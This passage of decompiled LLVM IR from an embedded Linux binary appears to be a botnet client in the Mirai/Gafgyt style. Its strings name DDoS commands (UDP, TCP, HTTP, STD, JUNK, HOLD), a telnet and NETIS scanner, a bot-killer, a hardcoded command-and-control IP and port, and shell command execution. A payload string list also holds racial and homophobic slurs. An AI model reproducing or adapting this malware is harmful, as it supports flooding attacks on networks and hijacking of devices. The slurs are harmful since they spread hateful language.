([71 x i8], [71 x i8]* @global_var_1001a318.847, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_1001a360.848, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_1001a3b4.849, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1001a404.850, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1001a44c.851, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1001a498.852, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1001a4e4.853, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1001a52c.854, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1001a57c.855, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_1001a5cc.856, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_1001a600.857, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_1001a634.858, i32 0, i32 0)]
@global_var_100192f4.860 = constant [6 x i8] c"close\00"
@global_var_100192fc.861 = constant [11 x i8] c"keep-alive\00"
@global_var_10019308.862 = constant [7 x i8] c"accept\00"
@global_var_1001a774.866 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_10009754.867 = constant i32 939524096
@global_var_100097cc.868 = constant [3 x i8] c"8`\00"
@global_var_1001a7b4.869 = constant [6 x i8] c"arfgG\00"
@global_var_1001a7bc.870 = constant [9 x i8] c"HBiug655\00"
@global_var_1001a7c8.871 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1001a7d8.872 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1001a7ec.873 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1001a800.874 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1001a80c.875 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1001a818.876 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1001a824.877 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1001a830.878 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1001a83c.879 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1001a84c.880 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1001a858.881 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1001a868.882 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1001a874.883 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1001a884.884 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1001a890.885 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1001a89c.886 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1001a8a8.887 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1001a8b8.888 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1001a8c8.889 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1001a8d8.890 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1001a8e4.891 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1001a8f4.892 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1001a904.893 = constant [12 x i8] c"yteytietyue\00"
@global_var_1001a910.894 = constant [9 x i8] c"qsortEQS\00"
@global_var_1001a91c.895 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1001a92c.896 = constant [4 x i8] c"std\00"
@global_var_1001a930.897 = constant [4 x i8] c"dts\00"
@global_var_1001a934.898 = constant [6 x i8] c"hackz\00"
@global_var_1001a93c.899 = constant [7 x i8] c"shdyed\00"
@global_var_1001a944.900 = constant [5 x i8] c"http\00"
@global_var_1001a94c.901 = constant [10 x i8] c"sghwiondc\00"
@global_var_1001a958.902 = constant [7 x i8] c"nigger\00"
@global_var_1001a960.903 = constant [6 x i8] c"pussy\00"
@global_var_1001a968.904 = constant [7 x i8] c"faggot\00"
@global_var_1001a970.905 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001a7b4.869, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001a7bc.870, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001a7c8.871, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1001a7d8.872, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1001a7ec.873, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001a800.874, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001a80c.875, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001a818.876, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001a824.877, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001a830.878, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001a83c.879, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001a84c.880, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001a858.881, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001a868.882, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1001a874.883, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001a884.884, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001a890.885, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001a89c.886, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001a8a8.887, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001a8b8.888, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001a8c8.889, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001a8d8.890, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001a8e4.891, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001a8f4.892, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1001a904.893, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001a910.894, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1001a91c.895, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001a92c.896, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001a930.897, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001a934.898, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001a93c.899, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001a944.900, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001a94c.901, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001a958.902, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1001a960.903, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1001a968.904, i32 0, i32 0)]
@global_var_10009914.906 = constant i32 1207988689
@global_var_10009994.907 = constant [3 x i8] c"8`\00"
@global_var_100099bc.908 = constant [3 x i8] c"8`\00"
@global_var_100099c4.909 = constant i32 939524096
@global_var_1001aa00.910 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_10009ad8.911 = constant i32 1207960808
@global_var_10009b2c.912 = constant [3 x i8] c"8`\00"
@global_var_10009c1c.913 = constant i32 1207960468
@global_var_1001aa1c.914 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_10009c6c.915 = constant i32 1207960388
@global_var_10009ca0.916 = constant i32 1207987781
@global_var_1000a078.917 = constant [3 x i8] c"8`\00"
@global_var_1000a088.918 = constant [3 x i8] c"8`\00"
@global_var_1000a1b8.919 = constant i32 1207960884
@global_var_1000a208.920 = constant i32 1207960804
@global_var_1001aa40.921 = constant [4 x i8] c"all\00"
@global_var_1001aa44.922 = constant i32 738197504
@global_var_1001aa48.923 = constant [4 x i8] c"syn\00"
@global_var_1001aa4c.924 = constant [4 x i8] c"rst\00"
@global_var_1001aa50.925 = constant [4 x i8] c"fin\00"
@global_var_1001aa54.926 = constant [4 x i8] c"ack\00"
@global_var_1001aa58.927 = constant [4 x i8] c"psh\00"
@global_var_1001aa5c.928 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1000a4dc.929 = constant [3 x i8] c"8`\00"
@global_var_1000a840.930 = constant [3 x i8] c"8`\00"
@global_var_1000a994.931 = constant i32 1207960216
@global_var_1000adb4.932 = constant [3 x i8] c"8`\00"
@global_var_1000af08.933 = constant i32 1207960392
@global_var_1001aa70.934 = constant [6 x i8] c"PONG!\00"
@global_var_1000b320.935 = constant i32 1207964528
@global_var_1001aa78.936 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_1001aa84.937 = constant [10 x i8] c"My IP: %s\00"
@global_var_1000b384.938 = constant i32 1207964428
@global_var_1001aa90.939 = constant [8 x i8] c"BOTKILL\00"
@global_var_1001aa98.940 = constant [13 x i8] c"Killing Bots\00"
@global_var_1000b3e0.941 = constant [3 x i8] c"8`\00"
@global_var_1001aaa8.942 = constant [7 x i8] c"LOOPME\00"
@global_var_1001aab0.943 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_1000b43c.944 = constant [3 x i8] c"8`\00"
@global_var_1001aac0.945 = constant [7 x i8] c"TELNET\00"
@global_var_1001aac8.946 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_1000b490.947 = constant i32 1207964160
@global_var_1001aad8.948 = constant [4 x i8] c"OFF\00"
@global_var_1002c910.949 = local_unnamed_addr global i32 0
@global_var_1001aadc.950 = constant [5 x i8] c" OFF\00"
@global_var_1001aae4.951 = constant [3 x i8] c"ON\00"
@global_var_1000b57c.952 = constant [3 x i8] c"8`\00"
@global_var_1001aae8.953 = constant [6 x i8] c"NETIS\00"
@global_var_1001aaf0.954 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_1000b5fc.955 = constant [3 x i8] c"8`\00"
@global_var_1001ab0c.956 = constant [5 x i8] c"HOLD\00"
@global_var_1000b71c.957 = constant [3 x i8] c"8`\00"
@global_var_1000b724.958 = constant [3 x i8] c"8`\00"
@global_var_1000b76c.959 = constant [3 x i8] c"8`\00"
@global_var_1001ab14.960 = constant [5 x i8] c"JUNK\00"
@global_var_1000b89c.961 = constant [3 x i8] c"8`\00"
@global_var_1000b8a4.962 = constant [3 x i8] c"8`\00"
@global_var_1000b8ec.963 = constant [3 x i8] c"8`\00"
@global_var_1001ab1c.964 = constant [4 x i8] c"UDP\00"
@global_var_1000bb4c.965 = constant [3 x i8] c"8`\00"
@global_var_1000bb54.966 = constant [3 x i8] c"8`\00"
@global_var_1000bba8.967 = constant [3 x i8] c"8`\00"
@global_var_1001ab20.968 = constant [5 x i8] c"HTTP\00"
@global_var_1000bcd4.969 = constant [3 x i8] c"8`\00"
@global_var_1000bcdc.970 = constant [3 x i8] c"8`\00"
@global_var_1000bdac.971 = constant [3 x i8] c"8`\00"
@global_var_1001ab28.972 = constant [4 x i8] c"CNC\00"
@global_var_1000bedc.973 = constant [3 x i8] c"8`\00"
@global_var_1000bee4.974 = constant [3 x i8] c"8`\00"
@global_var_1000bf2c.975 = constant [3 x i8] c"8`\00"
@global_var_1001ab2c.976 = constant [6 x i8] c"COMBO\00"
@global_var_1000c07c.977 = constant [3 x i8] c"8`\00"
@global_var_1000c084.978 = constant [3 x i8] c"8`\00"
@global_var_1000c0ec.979 = constant [3 x i8] c"8`\00"
@global_var_1001ab34.980 = constant [4 x i8] c"STD\00"
@global_var_1000c20c.981 = constant [3 x i8] c"8`\00"
@global_var_1000c214.982 = constant [3 x i8] c"8`\00"
@global_var_1000c25c.983 = constant [3 x i8] c"8`\00"
@global_var_1001ab38.984 = constant [4 x i8] c"TCP\00"
@global_var_1000c4cc.985 = constant [3 x i8] c"8`\00"
@global_var_1000c4d4.986 = constant [3 x i8] c"8`\00"
@global_var_1000c52c.987 = constant [3 x i8] c"8`\00"
@global_var_1001ab3c.988 = constant [5 x i8] c"STOP\00"
@global_var_1001ab44.989 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_1002c8a0.990 = local_unnamed_addr global i32 -1
@global_var_10015d00.991 = constant [15 x i8] c"191.96.249.102\00"
@global_var_1002c890.992 = global [15 x i8]* @global_var_10015d00.991
@global_var_1002c894.993 = local_unnamed_addr global i32 987
@global_var_1001ab50.994 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1001ab58.995 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1001ab68.996 = constant [11 x i8] c"\0900000000\09\00"
@global_var_1000ca7c.997 = constant i32 939524096
@global_var_1002c8f0.998 = global i32 0
@global_var_1000cad0.999 = constant i32 1207959564
@global_var_1001ab74.1000 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_1001ab84.1001 = constant [7 x i8] c"SERVER\00"
@global_var_1001ab8c.1002 = constant [7 x i8] c"ROUTER\00"
@global_var_1001ab94.1003 = constant i32 0
@global_var_1001ab98.1004 = constant [5 x i8] c"sshd\00"
@global_var_1001aba0.1005 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_1002c89c.1006 = local_unnamed_addr global i32 1
@global_var_1001abb4.1007 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_1000cca4.1008 = constant [3 x i8] c"8`\00"
@global_var_1000ccc4.1009 = constant [3 x i8] c"8`\00"
@global_var_1000cce8.1010 = constant i32 1207962653
@global_var_1000cd14.1011 = constant [3 x i8] c"8`\00"
@global_var_1000cd48.1012 = constant i32 1207963397
@global_var_1001abc4.1013 = constant i32 788529152
@global_var_1000cd58.1014 = constant [3 x i8] c"8`\00"
@global_var_1000cd64.1015 = constant i32 1207959556
@global_var_1001abc8.1016 = constant i32 458961211
@global_var_1001ac44.1017 = constant [9 x i8] c"VOIDV1.0\00"
@global_var_1000cdd4.1018 = constant i32 939524096
@global_var_1001ac50.1019 = constant [5 x i8] c"PONG\00"
@global_var_1000d118.1020 = constant i32 1207960696
@global_var_1001ac58.1021 = constant [4 x i8] c"DUP\00"
@global_var_1001ac5c.1022 = constant [8 x i8] c"%s 2>&1\00"
@0 = constant i32 1912602624
@global_var_1000d3d4.1024 = constant [3 x i8] c"8`\00"
@global_var_1000d404.1025 = constant [3 x i8] c"8`\00"
@global_var_1000d40c.1026 = constant i32 939524097
@global_var_1001ac68.1027 = constant i32 536870912
@global_var_1000d648.1028 = constant i32 1207959564
@global_var_1000dcc8.1029 = constant i32 939524118
@global_var_1002c8a8 = external local_unnamed_addr global i32
@global_var_1002c940.1035 = global i32 0
@global_var_1000e080.1036 = constant [3 x i8] c" c\00"
@global_var_1000e09c.1037 = constant [3 x i8] c" c\00"
@global_var_1001b26c.1038 = constant i32 0
@global_var_1002c568.1039 = global i32 0
@global_var_1002c580.1040 = global i32 0
@global_var_1002c8c8.1041 = global i32* bitcast (i16* @global_var_1002c598.1032 to i32*)
@global_var_10011758.1042 = constant [3 x i8] c"8`\00"
@global_var_1000e3e8.1043 = constant i32 1207961092
@global_var_1000e514.1044 = constant i32 1207960768
@global_var_1001b2a0.1045 = constant i32 269488136
@global_var_1001b284.1046 = constant [6 x i8] c"(nil)\00"
@global_var_1001b28c.1047 = constant [7 x i8] c"(null)\00"
@global_var_1001b294.1048 = constant i32 721431808
@global_var_1000e970.1049 = constant i32 939524096
@global_var_1001b320.1050 = constant i32 65793
@global_var_1001b308.1051 = constant i32 524293
@global_var_1001b300.1052 = constant [8 x i8] c" +0-#'I\00"
@global_var_1001b2a8.1053 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1001b2e8.1054 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1001b2dc.1055 = constant i32 67343
@global_var_1001b2db.1056 = constant i32 50331911
@global_var_1001b2cc.1057 = constant i32 268435461
@global_var_1001b2bc.1058 = constant i32 520093701
@global_var_1000f318.1059 = constant i32 939589631
@global_var_1000f3cc.1060 = constant i32 939524118
@global_var_1001b33c.1061 = constant [8 x i8] c"Success\00"
@global_var_1001b32c.1062 = constant [15 x i8] c"Unknown error \00"
@global_var_1001c076.1063 = constant i32 1
@global_var_1002c8dc.1064 = local_unnamed_addr global i32* @global_var_1001c076.1063
@global_var_1002c920.1065 = global i32 0
@global_var_1001bf20.1066 = constant [15 x i8] c"Resolver error\00"
@global_var_1001bea0.1067 = constant [8 x i8] c"Error 0\00"
@global_var_1001bea8.1068 = constant [13 x i8] c"Unknown host\00"
@global_var_1001beb8.1069 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_1001bed4.1070 = constant [21 x i8] c"Unknown server error\00"
@global_var_1001beec.1071 = constant [32 x i8] c"No address associated with name\00"
@global_var_1001bf0c.1072 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001bea0.1067, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001bea8.1068, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1001beb8.1069, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1001bed4.1070, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1001beec.1071, i32 0, i32 0)]
@global_var_1001bf32.1073 = constant i32 0
@global_var_1001bf30.1074 = constant [3 x i8] c": \00"
@global_var_1001be98.1075 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_10032980.1076 = global i32 0
@global_var_10032b5c.1077 = global i32 0
@global_var_10032990.1078 = global i32 0
@global_var_1002c860.1079 = global i32 0
@global_var_1002c94c.1080 = local_unnamed_addr global i32 0
@global_var_10032c48.1081 = global i32 0
@global_var_1001019c.1082 = constant [3 x i8] c"8`\00"
@global_var_10010280.1083 = constant i32 939524098
@global_var_100102c0.1084 = constant [3 x i8] c"8`\00"
@global_var_100104c8.1085 = constant i32 939524118
@global_var_10010550.1086 = constant i32 939524118
@global_var_10032ba0.1087 = global i32 0
@global_var_10032b70.1088 = global i32 0
@global_var_1002c8d0 = external global i32
@global_var_1002c930.1091 = local_unnamed_addr global i32 0
@global_var_10032c20.1092 = global i32 0
@global_var_100107ac.1093 = constant i32 939524108
@global_var_10010844.1094 = constant [3 x i8] c"8`\00"
@global_var_10010a4c.1095 = constant i32 1207959640
@global_var_10010a88.1096 = constant i32 1207959580
@global_var_1002c790.1097 = global i32 0
@global_var_1002c7a8 = external global i32
@global_var_1002c7c8.1099 = global i32 -1726662223
@global_var_1002c7b0.1100 = local_unnamed_addr global i32* @global_var_1002c7c8.1099
@global_var_1002c7ac.1101 = global i32* @global_var_1002c7c8.1099
@global_var_1001bf34.1102 = constant i32 0
@global_var_10010da0.1103 = constant i32 939524118
@global_var_1001bf5c.1104 = constant [8 x i8] c"/bin/sh\00"
@global_var_1001bf64.1105 = constant [3 x i8] c"sh\00"
@global_var_1001bf68.1106 = constant [3 x i8] c"-c\00"
@global_var_100110f4.1107 = constant [3 x i8] c"8`\00"
@global_var_10011308.1108 = constant i32 939524130
@global_var_1002c844.1109 = global i32 0
@global_var_1002c924.1110 = local_unnamed_addr global i32 0
@global_var_1001139c.1111 = constant i32 1207960361
@global_var_1002c92c.1112 = local_unnamed_addr global i32 0
@global_var_1002c3a4.1113 = global i32 -1
@global_var_1002c934.1114 = local_unnamed_addr global i32 0
@global_var_1002c938.1115 = local_unnamed_addr global i32 0
@global_var_1001bf6c.1116 = constant [10 x i8] c"/dev/null\00"
@global_var_1002c93c.1117 = local_unnamed_addr global i32 0
@global_var_1002c928.1118 = local_unnamed_addr global i32 0
@global_var_10011a70.1119 = constant i32 939524096
@global_var_10011a8c.1120 = constant i32 939524096
@global_var_1002c960.1121 = local_unnamed_addr global i32 0
@global_var_1002c944.1122 = global i32 0
@global_var_10011e00.1123 = constant i32 939524180
@global_var_1001219c.1124 = constant i32 939524105
@global_var_1001c2a0.1125 = constant [4 x i8] c"inf\00"
@global_var_1001c2a3.1127 = constant i32 4804166
@global_var_1001c2b0.1128 = constant i32 771763200
@global_var_10032b88.1130 = global i32 0
@global_var_1002c948.1131 = local_unnamed_addr global i32 0
@global_var_10013018.1133 = constant i32 1207960848
@global_var_1002c950.1134 = local_unnamed_addr global i32 0
@global_var_1001c300.1135 = constant i32 771751936
@global_var_10032c38.1136 = global i32 0
@global_var_10013108.1137 = constant [3 x i8] c"8a\00"
@global_var_10013114.1138 = constant i32 939524097
@global_var_100131e8.1139 = constant i32 939524097
@global_var_100132bc.1140 = constant i32 939524097
@global_var_100132e8.1141 = constant i32 939524100
@global_var_100133c8.1142 = constant i32 1207959684
@global_var_10013544.1143 = constant i32 939589631
@global_var_1001c31c.1144 = constant i32 1912602624
@global_var_1001c308.1145 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1001c320.1146 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1001c338.1147 = constant [11 x i8] c"nameserver\00"
@global_var_1001c344.1148 = constant [7 x i8] c"domain\00"
@global_var_1001c34c.1149 = constant [7 x i8] c"search\00"
@global_var_1001387c.1150 = constant i32 1207959568
@global_var_10013884.1151 = constant i32 939524099
@global_var_1002c878.1152 = global i32 0
@global_var_100139e4.1153 = constant i32 939524129
@global_var_1002c954.1154 = local_unnamed_addr global i32 0
@global_var_10013a58.1155 = constant [3 x i8] c"8`\00"
@global_var_10013a90.1156 = constant i32 939524129
@global_var_1002c958.1157 = local_unnamed_addr global i32 0
@global_var_1002c95c.1158 = local_unnamed_addr global i32 0
@global_var_1002c918.1159 = local_unnamed_addr global i32 0
@global_var_10013d28.1161 = constant i32 1207961081
@global_var_10013f50.1162 = constant i32 939524171
@global_var_10013fe0.1163 = constant i32 1207960120
@global_var_1002c8cc.1164 = local_unnamed_addr global i32 2
@global_var_10014214.1165 = constant i32 1207959560
@global_var_100144f4.1166 = constant i32 1207959708
@global_var_1001459c.1167 = constant i32 1207959612
@global_var_10014994.1168 = constant [3 x i8] c"8`\00"
@global_var_1001c368.1169 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_10014b8c.1170 = constant [3 x i8] c"9 \00"
@global_var_10014b98.1171 = constant i32 939524193
@global_var_10014c00.1173 = constant i32 939524101
@global_var_10014cec.1174 = constant i32 939524124
@global_var_10014d64.1175 = constant i32 1207960116
@global_var_10014d7c.1176 = constant i32 939524105
@global_var_10014ef4.1177 = constant [3 x i8] c"9 \00"
@global_var_1001c37c.1178 = constant [3 x i8] c"%x\00"
@global_var_10014f80.1179 = constant i32 939524124
@global_var_10014fa4.1180 = constant i32 939524193
@global_var_1001c380.1181 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001c38c.1182 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_10015690.1183 = constant i32 1207959560
@global_var_10015728.1184 = constant i32 939589631
@global_var_10015c0c.1185 = constant i32 939524105
@global_var_1002c3a8.1186 = global i32 0
@global_var_1002c964.2 = local_unnamed_addr global i8 0
@global_var_1002c8f8.43 = external global i8*
@global_var_1002c8f9.44 = local_unnamed_addr global i8 0
@global_var_1002c8fa.45 = local_unnamed_addr global i8 0
@global_var_1002c8fb.46 = local_unnamed_addr global i8 0
@global_var_1002c8fc.47 = local_unnamed_addr global i8 0
@global_var_1002c598.1032 = global i16 288
@global_var_1002c5e8.1033 = local_unnamed_addr global i16 272
@global_var_1002c91c.1160 = local_unnamed_addr global i16* null
@global_var_1002c85c.1132 = local_unnamed_addr global i16 1
@global_var_1001ac64.1023 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1002c964.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002c3bc.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002c3bc.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002c3bc.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1002c964.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1002c964.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1002c3b4.8, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1002c3b4.8 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268487528, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268524764, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002c980.9, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_1002c984.10, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_1002c988.11, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_1002c980.9 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_1002c980.9 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
